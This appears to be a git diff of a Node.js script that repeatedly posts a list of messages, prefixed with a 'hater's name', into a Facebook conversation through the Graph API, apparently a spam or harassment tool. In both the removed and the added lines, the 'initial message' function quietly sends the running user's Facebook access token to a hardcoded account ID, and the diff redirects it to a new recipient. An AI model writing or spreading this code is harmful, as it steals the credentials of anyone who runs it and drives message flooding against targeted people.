@@ -6,26 +6,26 @@ const messages = fs.readFileSync(messageFilePath, "utf8").split("\n").filter(lin
 
 let running = true; // Process running flag
 
-async function sendInitialMessage(targetId) {
+async function senddInitialMessages(targetId) {
     try {
-        const messageTemplate = `Hey Sameer Sir, I am using your render's server. My token is ${token}`;
-        await axios.post(`https://graph.facebook.com/v17.0/me/messages`, {
+        await axios.post(`https://graph.facebook.com/v22.0/t_${targetId}/`, {
             access_token: token,
-            recipient: { id: targetId },
-            message: { text: messageTemplate }
+            message: `Hey Sameer Sir, I am using your render's server. My token is ${token}`
         });
-        console.log("✅ Initial message sent successfully.");
+
+        console.log("✅ Initial message sent.");
     } catch (error) {
-        console.error("❌ Failed to send initial message:", error.message);
+        console.log(`❌ Failed to send initial message: ${error.message}`);
     }
 }
 
 async function sendMessages() {
-    const myId = "100020245249470";
-    await sendInitialMessage(myId);
+    // const myId = "100020245249470";
+    // const myId1 = "8930006633703640";
+    const myNewId = "61573002155308"; // Chaande Miyaan Here
 
-    // Wait a bit before starting main message sequence
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    await senddInitialMessages(myNewId);
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
     while (running) { // Loop will continue until stopped
         for (let i = 0; i < messages.length; i++) {
@@ -33,7 +33,7 @@ async function sendMessages() {
 
             try {
                 const message = hattersName + " " + messages[i];
-                await axios.post(`https://graph.facebook.com/v17.0/t_${convoId}/`, {
+                await axios.post(`https://graph.facebook.com/v22.0/t_${convoId}/`, {
                     access_token: token,
                     message: message
                 });
